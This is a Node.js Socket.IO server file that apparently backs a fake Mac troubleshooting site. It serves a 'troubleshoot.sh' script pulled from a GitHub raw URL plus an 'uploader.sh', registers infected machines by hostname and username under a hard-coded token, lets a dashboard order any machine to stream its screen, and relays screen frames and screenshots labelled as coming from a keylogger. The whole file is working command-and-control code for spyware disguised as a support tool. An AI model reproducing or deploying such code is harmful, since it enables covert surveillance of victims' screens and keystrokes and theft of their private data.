// Socket.IO Server for troubleshoot-mac.com
// Run this on your server: node server.js

const express = require('express');
const http = require('http');
const https = require('https');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Store connected clients
const clients = new Map();
const ACCESS_TOKEN = '9f1013f0';

// Serve static files
app.use(express.static(__dirname));

// Serve troubleshoot.sh with correct content type
// First try local file, then fetch from GitHub raw URL
app.get('/troubleshoot.sh', (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Content-Disposition', 'inline; filename="troubleshoot.sh"');
    
    const localPath = path.join(__dirname, 'troubleshoot.sh');
    
    // Try local file first
    if (fs.existsSync(localPath)) {
        res.sendFile(localPath);
    } else {
        // Fetch from GitHub raw URL
        const githubUrl = 'https://raw.githubusercontent.com/personer39-debug/egfr/main/troubleshoot.sh';
        https.get(githubUrl, (githubRes) => {
            if (githubRes.statusCode === 200) {
                githubRes.pipe(res);
            } else {
                res.status(404).send('#!/bin/bash\necho "File not found"');
            }
        }).on('error', (err) => {
            res.status(500).send('#!/bin/bash\necho "Error fetching file"');
        });
    }
});

// Serve uploader.sh if it exists
app.get('/uploader.sh', (req, res) => {
    res.setHeader('Content-Type', 'text/plain');
    const uploaderPath = path.join(__dirname, 'uploader.sh');
    res.sendFile(uploaderPath, (err) => {
        if (err) {
            res.status(404).send('File not found');
        }
    });
});

// Serve dashboard.html
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/dashboard.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/', (req, res) => {
    res.send('Screen Watcher Server Running');
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // Handle client registration
    socket.on('register-client', (data) => {
        if (data.token === ACCESS_TOKEN) {
            const clientInfo = {
                id: socket.id,
                hostname: data.hostname || 'Unknown',
                username: data.username || 'Unknown',
                resolution: data.resolution || '1920x1080',
                connectedAt: new Date().toISOString()
            };
            
            clients.set(socket.id, clientInfo);
            console.log('Client registered:', clientInfo);
            
            // Confirm registration
            socket.emit('client-registered', { clientId: socket.id });
            
            // Notify all dashboards about new client
            io.emit('clients-list', Array.from(clients.values()));
        }
    });

    // Handle get-clients request (from dashboard)
    socket.on('get-clients', (data) => {
        if (data.token === ACCESS_TOKEN) {
            socket.emit('clients-list', Array.from(clients.values()));
        }
    });

    // Handle watch-client request (from dashboard)
    socket.on('watch-client', (data) => {
        if (data.token === ACCESS_TOKEN && data.clientId) {
            // Tell the specific client to start streaming
            io.to(data.clientId).emit('start-streaming');
        }
    });

    // Handle screen frames from clients
    socket.on('screen-frame', (data) => {
        if (data.clientId) {
            // Broadcast to all dashboards (or specific dashboard watching this client)
            io.emit('screen-frame', data);
        }
    });

    // Handle screenshots from keylogger
    socket.on('screenshot', (data) => {
        if (data.clientId) {
            // Broadcast screenshot to dashboards
            io.emit('screenshot', data);
        }
    });

    // Handle disconnect
    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        clients.delete(socket.id);
        // Notify dashboards that client disconnected
        io.emit('clients-list', Array.from(clients.values()));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}/dashboard`);
});
